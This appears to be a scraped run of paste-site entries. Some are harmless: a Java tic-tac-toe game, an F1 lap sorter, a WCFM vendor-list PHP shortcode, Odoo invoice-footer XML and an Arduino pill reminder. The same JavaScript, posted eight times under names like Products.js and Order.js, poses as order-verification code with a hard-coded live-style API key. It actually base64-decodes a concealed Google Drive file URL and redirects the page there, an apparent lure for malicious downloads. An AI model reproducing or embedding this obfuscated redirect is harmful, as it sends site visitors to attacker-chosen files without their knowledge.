            System.out.println(""Player "" + symbol + "", enter your move (row [0-2] column [0-2]): "");
            row = scanner.nextInt();
            col = scanner.nextInt();
            move = new Move(row, col);
            
            if (!board.isValidMove(move)) {
                System.out.println(""Invalid move! Try again."");
            }
        } while (!board.isValidMove(move));
        
        return move;
    }
    
    @Override
    public char getSymbol() {
        return symbol;
    }
}

// Computer AI player implementation (easy to extend for different strategies)
class ComputerPlayer implements Player {
    private final char symbol;
    private final MoveStrategy moveStrategy;
    
    public ComputerPlayer(char symbol, MoveStrategy moveStrategy) {
        this.symbol = symbol;
        this.moveStrategy = moveStrategy;
    }
    
    @Override
    public Move makeMove(GameBoard board) {
        System.out.println(""Computer player "" + symbol + "" is making a move..."");
        return moveStrategy.calculateMove(board, symbol);
    }
    
    @Override
    public char getSymbol() {
        return symbol;
    }
}

// Strategy pattern for different AI levels (Open/Closed Principle)
interface MoveStrategy {
    Move calculateMove(GameBoard board, char symbol);
}

// Random move strategy implementation
class RandomMoveStrategy implements MoveStrategy {
    private final Random random = new Random();
    
    @Override
    public Move calculateMove(GameBoard board, char symbol) {
        int size = board.getSize();
        int row, col;
        Move move;
        
        do {
            row = random.nextInt(size);
            col = random.nextInt(size);
            move = new Move(row, col);
        } while (!board.isValidMove(move));
        
        return move;
    }
}

// Game controller handles the game flow (Single Responsibility Principle)
class GameController {
    private final GameBoard board;
    private final Player player1;
    private final Player player2;
    private Player currentPlayer;
    private GameState gameState;
    private final Scanner scanner;
    
    public GameController(GameBoard board, Player player1, Player player2) {
        this.board = board;
        this.player1 = player1;
        this.player2 = player2;
        this.currentPlayer = player1; // X goes first
        this.gameState = GameState.PLAYING;
        this.scanner = new Scanner(System.in);
    }
    
    public void startGame() {
        System.out.println(""Welcome to Tic Tac Toe!"");
        board.printBoard();
        
        while (gameState == GameState.PLAYING) {
            playTurn();
            checkGameState();
            switchPlayer();
        }
        
        announceResult();
        
        if (askForRematch()) {
            resetGame();
            startGame();
        } else {
            System.out.println(""Thanks for playing!"");
        }
    }
    
    private void playTurn() {
        System.out.println(""Player "" + currentPlayer.getSymbol() + ""'s turn."");
        Move move = currentPlayer.makeMove(board);
        board.placeMove(move, currentPlayer.getSymbol());
        board.printBoard();
    }
    
    private void checkGameState() {
        if (board.checkWin(currentPlayer.getSymbol())) {
            gameState = GameState.WIN;
        } else if (board.isBoardFull()) {
            gameState = GameState.DRAW;
        }
    }
    
    private void switchPlayer() {
        currentPlayer = (currentPlayer == player1) ? player2 : player1;
    }
    
    private void announceResult() {
        if (gameState == GameState.WIN) {
            // Switch back to the winning player
            switchPlayer();
            System.out.println(""Player "" + currentPlayer.getSymbol() + "" wins!"");
        } else if (gameState == GameState.DRAW) {
            System.out.println(""It's a draw!"");
        }
    }
    
    private boolean askForRematch() {
        System.out.println(""Would you like to play again? (y/n): "");
        String answer = scanner.next().toLowerCase();
        return answer.equals(""y"") || answer.equals(""yes"");
    }
    
    private void resetGame() {
        board.reset();
        currentPlayer = player1; // X always starts
        gameState = GameState.PLAYING;
    }
}

// Enum for game state (Type safety)
enum GameState {
    PLAYING, WIN, DRAW
}

"
5rEGs5aA,Products.js,hubertzoo90,JavaScript,Monday 14th of April 2025 07:53:55 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/03479/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
qkMWkLjW,Order.js,hubertzoo90,JavaScript,Monday 14th of April 2025 07:38:33 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/23665/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
nCWMUx1x,Market.js,hubertzoo90,JavaScript,Monday 14th of April 2025 07:23:11 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/03107/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
Y41EuSPn,Untitled,hubertzoo90,JavaScript,Monday 14th of April 2025 07:07:27 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/46563/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
Xu4x88By,wcfm_shortcode_get_vendor_list_by_spmv_product_id,palsushobhan,PHP,Monday 14th of April 2025 06:57:29 AM CDT,"/* List of vendors selling a particular product (SPMV), sorted by product price ASC
 * 
 * Shortcode: [wcfm_vendors_card_by_product id=""123""]
 * 
 * @param array $attr Shortcode attributes.
 * @return string HTML output of vendor cards.
 */
add_shortcode('wcfm_vendors_card_by_product', function ($attr) {
    global $wpdb, $WCFMmp;

    $defaults = array(
        'id' => 0,
    );
    $atts = shortcode_atts($defaults, $attr);

    $product_id = absint(filter_input(INPUT_GET, 'id'));
    if (!$product_id && $atts['id'] && absint($atts['id'])) {
        $product_id = absint($atts['id']);
    }
    if (!$product_id) {
        return '';
    }

    $product = wc_get_product($product_id);
    if (!$product) {
        return '';
    }

    $vendor_id_single = wcfm_get_vendor_id_by_post($product_id);
    $vendor_list = [];
    $is_multi_vendor_enabled = apply_filters('wcfm_is_allow_product_multivendor_title_edit_disable', true);

    if (!$is_multi_vendor_enabled) {
        if(wcfm_is_vendor($vendor_id_single)) {
            $vendor_list[] = $vendor_id_single;
        }
    } else {
        $multi_parent_id = get_post_meta($product_id, '_is_multi_parent', true) ?: get_post_meta($product_id, '_has_multi_selling', true);

        if ($multi_parent_id) {
            $sql = $wpdb->prepare(
                ""SELECT GROUP_CONCAT(product_id) as products
                FROM `{$wpdb->prefix}wcfm_marketplace_product_multivendor`
                WHERE `parent_product_id` = %d"",
                $multi_parent_id
            );
            $results = $wpdb->get_row($sql);
            $product_list = isset($results->products) ? explode(',', $results->products) : array();

            if (!in_array($multi_parent_id, $product_list)) {
                array_unshift($product_list, $multi_parent_id);
            }

            $product_ids = implode(',', $product_list);
            $sql = ""SELECT product_id, stock_status, stock_quantity
                    FROM {$wpdb->wc_product_meta_lookup} wc_product_meta_lookup
                    WHERE product_id IN (%1s)
                    ORDER BY wc_product_meta_lookup.min_price ASC"";
            $prepare = $wpdb->prepare($sql, $product_ids);
            $product_metas = $wpdb->get_results($prepare);

            if (!empty($product_metas)) {
                foreach ($product_metas as $product_meta) {
                    if ($product_meta->stock_status === 'outofstock') {
                        continue;
                    }
                    $post_status = get_post_status($product_meta->product_id);
                    if ($post_status !== 'publish') {
                        continue;
                    }
                    $vendor_id = wcfm_get_vendor_id_by_post($product_meta->product_id);
                    if (wcfm_is_vendor($vendor_id) && !in_array($vendor_id, $vendor_list)) {
                        $vendor_list[] = $vendor_id;
                    }
                }
            }
        } else {
            if (wcfm_is_vendor($vendor_id_single) && !in_array($vendor_id_single, $vendor_list)) {
                $vendor_list[] = $vendor_id_single;
            }
        }
    }

    if (empty($vendor_list)) {
        return '';
    }

    ob_start();
    ?>
    <div id=""wcfmmp-stores-wrap"" class=""top-vendor-container"">
        <div class=""wcfmmp-stores-content"">
            <ul class=""top-vendor-list wcfmmp-store-wrap"">
                <?php
                $args = array('per_row' => 3);
                foreach ($vendor_list as $vendor_id) {
                    $args['store_id'] = $vendor_id;
                    $WCFMmp->template->get_template('store-lists/wcfmmp-view-store-lists-card.php', $args);
                }
                ?>
            </ul>
        </div>
    </div>
    <?php
    $list = ob_get_contents();
    ob_end_clean();
    return $list;
});"
NzGBj4AT,Products.js,hubertzoo90,JavaScript,Monday 14th of April 2025 06:51:42 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/83205/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
CRjJabA2,[NP] F1 Race,dzocesrce,Java,Monday 14th of April 2025 06:40:33 AM CDT,"import java.io.*;
import java.util.List;
import java.util.stream.Collectors;
import java.time.Duration;
import java.time.LocalTime;
import java.util.ArrayList;
import java.util.Comparator;
import java.util.List;

class Driver implements Comparable<Driver> {
    public static int finalPos=0;

    private String name;
    private List<Lap> laps;

    public Driver(String name,List<Lap> laps) {
        this.name = name;
        this.laps = laps;
    }

    private Lap getFastestLap(){
        return laps.stream().min(Comparator.naturalOrder()).get();
    }
    public static Driver createDriver(String s) {
        String[] parts = s.split(""\\s+"");
        String name = parts[0];
        List<Lap> laps = new ArrayList<>();
        laps.add(new Lap(parts[1]));
        laps.add(new Lap(parts[2]));
        laps.add(new Lap(parts[3]));
        return new Driver(name,laps);
    }

    @Override
    public int compareTo(Driver o) {
        return (int)Long.compare(getFastestLap().getLocalTimeVersion().toNanoOfDay()
                ,o.getFastestLap().getLocalTimeVersion().toNanoOfDay());
    }

    @Override
    public String toString() {
        return String.format(""%d. %-10s%10s"",++finalPos,name,getFastestLap().getTime());
    }
}

class Lap implements Comparable<Lap>{
    private String time;

    public Lap(String time) {
        this.time = time;
    }

    public String getTime() {
        return time;
    }

    public LocalTime getLocalTimeVersion(){
        String[] parts= time.split("":"");
        int minutes= Integer.parseInt(parts[0]);
        int seconds= Integer.parseInt(parts[1]);
        int nanos= Integer.parseInt(parts[2]);
        return LocalTime.of(0,minutes,seconds,nanos);
    }

    @Override
    public int compareTo(Lap o) {
        return (int)Long.compare(getLocalTimeVersion().toNanoOfDay(),o.getLocalTimeVersion().toNanoOfDay());
    }

    @Override
    public String toString() {
        return time+"" ""+getLocalTimeVersion();
    }
}

class F1Race {

    private List<Driver> drivers;

    public F1Race() {
        this.drivers = drivers;
    }

    public void readResults(InputStream in) {
        BufferedReader bufferedReader = new BufferedReader(new InputStreamReader(in));
        this.drivers= bufferedReader.lines().map(i->Driver.createDriver(i)).collect(Collectors.toList());
    }

    public void printSorted(PrintStream out) {
        PrintWriter printWriter= new PrintWriter(out);

        this.drivers.stream().sorted().forEach(i->printWriter.println(i));
        printWriter.flush();
    }
}

public class F1Test {

    public static void main(String[] args) {
        F1Race f1Race = new F1Race();
        f1Race.readResults(System.in);
        f1Race.printSorted(System.out);

    }

}
"
dkppcMpU,Order.js,hubertzoo90,JavaScript,Monday 14th of April 2025 06:36:20 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/51513/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
QgyLBfhU,[QW][4707829]special_footer_external_layout_boxed,rht_odoo,XML,Monday 14th of April 2025 06:25:25 AM CDT,"<data>
    <!--
    Done by RHT on the 14/04/2025
    Need : different footer for commerical invoice
    Task : https://www.odoo.com/odoo/project.task/4707829
    Pastebin : https://pastebin.com/QgyLBfhU
    -->
    <xpath expr=""//div[3]"" position=""replace"">
        <div t-attf-class=""footer o_company_#{company.id}_layout {{report_type != 'pdf' and 'mt-auto'}}"" t-if=""commercial_footer"">
            <div class=""o_footer_content row border-top"">
                I certify that the information presented on this invoice is true and accurate to the best of my knowledge.
            </div>
            <div class=""row"">
                <div class=""col-5"">
                    <strong>Authorized By:</strong>   __________________________
                </div>
                <div class=""col-4"">
                    <strong>Title:</strong>   __________________________
                </div>
                <div class=""col-3"">
                    <strong>Date:</strong>   _________________
                </div>
            </div>
        </div>
        <div class=""o_footer_content row border-top pt-2"" t-if=""not commercial_footer"">
            <div class=""col-8"">
                <span t-field=""company.report_footer""/>
            </div>
            <div class=""col-4 text-end"">
                <strong t-if=""company.report_header"" t-field=""company.report_header"" class=""o_company_tagline"">Company tagline</strong>
                <span t-if=""report_type == 'pdf' and display_name_in_footer"" class=""text-muted"" t-out=""str(o.name) + ', '"">(document name)</span>
                <span t-if=""report_type == 'pdf'"" class=""text-muted"">Page <span class=""page""/> / <span class=""topage""/></span>
            </div>
        </div>
    </xpath>
</data>"
xQEgQzGy,[QW][4707829]commercial_footer_invoice_document,rht_odoo,XML,Monday 14th of April 2025 06:21:40 AM CDT,"<data>
    <!--
    Done by RHT on the 14/04/2025
    Need : different footer for commerical invoice
    Task : https://www.odoo.com/odoo/project.task/4707829
    Pastebin : https://pastebin.com/xQEgQzGy
    -->
    <xpath expr=""//t[2]"" position=""after"">
        <t t-set=""commercial_footer"" t-value=""true""/>
    </xpath>
</data>"
mAJLF5tp,Market.js,hubertzoo90,JavaScript,Monday 14th of April 2025 06:20:57 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/63729/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
jkGUCrX0,**Medication Reminder** rev_01,pleasedontcode,Arduino,Monday 14th of April 2025 06:05:44 AM CDT,"/********* Pleasedontcode.com **********

	Pleasedontcode thanks you for automatic code generation! Enjoy your code!

	- Terms and Conditions:
	You have a non-exclusive, revocable, worldwide, royalty-free license
	for personal and commercial use. Attribution is optional; modifications
	are allowed, but you're responsible for code maintenance. We're not
	liable for any loss or damage. For full terms,
	please visit pleasedontcode.com/termsandconditions.

	- Project: **Medication Reminder**
	- Source Code NOT compiled for: ESP8266 NodeMCU V1.0
	- Source Code created on: 2025-04-14 11:04:03

********* Pleasedontcode.com **********/

/****** SYSTEM REQUIREMENTS *****/
/****** SYSTEM REQUIREMENT 1 *****/
	/* Display reminder for pill at 4:40 pm ist via rtc */
/****** END SYSTEM REQUIREMENTS *****/

/* START CODE */

/****** DEFINITION OF LIBRARIES *****/
#include <EasyButton.h>	//https://github.com/evert-arias/EasyButton
#include <Wire.h>
#include <RTClib.h>
#include <LiquidCrystal_I2C.h>

// Initialize RTC and LCD
RTC_DS3231 rtc;
LiquidCrystal_I2C lcd(0x27, 16, 2); // I2C address may be 0x3F on some LCDs

// Medicine info
String medicines[4] = {""Paracetamol"", ""Vitamin C"", ""Antibiotic"", ""Painkiller""};
int reminderHours[4] = {16}; // Reminder set for 4 PM (16:00 in 24hr format)
int reminderMinutes[4] = {40}; // Reminder set for 40 minutes past the hour

// Other components
const int ledPin = 14;   // D5 on NodeMCU (Change pin if needed)
const int buzzerPin = 0; // D3 on NodeMCU
const int buttonPin = 2; // D4 on NodeMCU

// Flag to track reminders
bool alertTriggered[4] = {false, false, false, false};
unsigned long lastDisplayUpdate = 0;

/****** FUNCTION PROTOTYPES *****/
void setup(void);
void loop(void);

/***** DEFINITION OF DIGITAL INPUT PINS *****/
const uint8_t Button_PushButton_PIN_D1		= 1; // This pin is not used in the USER CODE

/****** DEFINITION OF LIBRARIES CLASS INSTANCES*****/

void setup(void)
{
	// put your setup code here, to run once:
	Serial.begin(9600);
	Wire.begin();
	rtc.begin();
	lcd.begin(16, 2);  // Corrected begin with cols and rows
	lcd.backlight();

	// Setup output pins
	pinMode(ledPin, OUTPUT);
	digitalWrite(ledPin, LOW);

	pinMode(buzzerPin, OUTPUT);
	pinMode(buttonPin, INPUT_PULLUP);

	lcd.setCursor(0, 0);
	lcd.print(""  Pill Time Boot "");
	delay(2000);
	lcd.clear();

	pinMode(Button_PushButton_PIN_D1, INPUT_PULLUP); // Keep this for compatibility with EasyButton
}

void loop(void)
{
	DateTime now = rtc.now();

	// Update time display every second
	if (millis() - lastDisplayUpdate >= 1000) {
		showTime(now);
		lastDisplayUpdate = millis();
	}

	// Check reminders
	for (int i = 0; i < 4; i++) {
		if (now.hour() == reminderHours[i] && now.minute() == reminderMinutes[i] && !alertTriggered[i]) {
			triggerReminder(i);
			alertTriggered[i] = true;
		}

		// Reset trigger for next day
		if (now.hour() != reminderHours[i] || now.minute() != reminderMinutes[i]) {
			alertTriggered[i] = false;
		}
	}

	delay(100);
}

void showTime(DateTime now) {
	char timeBuffer[9];
	sprintf(timeBuffer, ""%02d:%02d:%02d"", now.hour(), now.minute(), now.second());

	lcd.setCursor(0, 0);
	lcd.print(""Time: "");
	lcd.print(timeBuffer);
	lcd.print(""  ""); // Padding
}

void triggerReminder(int index) {
	lcd.clear();
	lcd.setCursor(0, 0);
	lcd.print(""Take: "");
	lcd.print(medicines[index].substring(0, 10)); // Fit name in LCD
	digitalWrite(ledPin, HIGH);  // Turn on LED
	tone(buzzerPin, 1000);

	// Wait for pushbutton acknowledgment
	while (digitalRead(buttonPin) == HIGH) {
		delay(100);
	}

	// Acknowledged
	noTone(buzzerPin);
	digitalWrite(ledPin, LOW);  // Turn off LED

	lcd.clear();
	lcd.setCursor(0, 0);
	lcd.print(medicines[index]);
	lcd.setCursor(0, 1);
	lcd.print(""Taken ✔"");
	delay(2000);
	lcd.clear();
}

/* END CODE */"
DF232KSR,Untitled,hubertzoo90,JavaScript,Monday 14th of April 2025 06:05:28 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/66544/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
